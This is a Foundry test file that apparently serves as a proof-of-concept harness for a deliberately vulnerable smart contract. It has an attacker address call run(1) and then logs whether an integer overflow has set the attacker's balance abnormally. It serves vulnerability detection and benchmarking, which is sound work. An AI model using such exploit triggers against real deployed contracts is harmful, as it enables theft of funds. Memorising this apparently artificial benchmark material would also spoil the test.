// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_multitx_onefunc_feasible.sol";

contract IntegerOverflowTest is Test {
    IntegerOverflowMultiTxOneFuncFeasible vulnerableContract;
    address attacker = address(0x1337);
    address innocentUser = address(0x999);
    uint256 constant MAX_UINT = type(uint256).max;

    function setUp() public {
        vulnerableContract = new IntegerOverflowMultiTxOneFuncFeasible();
        
        // Initialize the contract first (required by the logic)
        vm.prank(innocentUser);
        vulnerableContract.run(0);
    }

    function testBalanceUpdate() public {
        // Initial state check
        uint256 initialCount = vulnerableContract.getUserBalance(innocentUser);
        assertEq(initialCount, 0, "Initial count should be 0");
        
        console2.log("--- BEFORE-Trigger State ---");
        uint256 attackerBalanceBefore = vulnerableContract.getUserBalance(attacker);
        uint256 globalCountBefore = vulnerableContract.count();
        console2.log("Attacker Balance Before: %s", attackerBalanceBefore);
        console2.log("Global Count Before: %s", globalCountBefore);

        console2.log("--- Trigger: Attack Transaction (run(1)) ---");
        // Perform operation with input 1
        vm.prank(attacker);
        vulnerableContract.run(1);
        
        console2.log("--- AFTER-Trigger State ---");
        // Check state variables after operation
        uint256 attackerBalanceAfter = vulnerableContract.getUserBalance(attacker);
        uint256 globalCountAfter = vulnerableContract.count();
        console2.log("Attacker Balance After: %s", attackerBalanceAfter);
        console2.log("Global Count After: %s", globalCountAfter);

        // Vulnerability detection logic
        bool vulnerabilityDetected = false;
        string memory reason = "";
        
        if (attackerBalanceAfter == MAX_UINT) {
            vulnerabilityDetected = true;
            reason = "Integer overflow caused attacker balance to become MAX_UINT";
        } else if (attackerBalanceAfter != 0) {
            vulnerabilityDetected = true;
            reason = "Attacker balance should be 0 but has unexpected value";
        } else {
            reason = "No state change observed in attacker balance";
        }

        // Vulnerability verdict
        if (vulnerabilityDetected) {
            console2.log("Vulnerability Exists: %s", reason);
        } else {
            console2.log("Vulnerability not Exist: %s", reason);
        }
    }

    function testInitializationBehavior() public {
        // Create a new instance that hasn't been initialized
        IntegerOverflowMultiTxOneFuncFeasible newContract = new IntegerOverflowMultiTxOneFuncFeasible();
        
        // First call should initialize but not perform operation
        vm.prank(attacker);
        newContract.run(1);

        // Verify initialization happened but balance wasn't updated
        uint256 attackerBalance = newContract.getUserBalance(attacker);
        assertEq(attackerBalance, 0, "Balance should remain 0 after initialization");
    }
}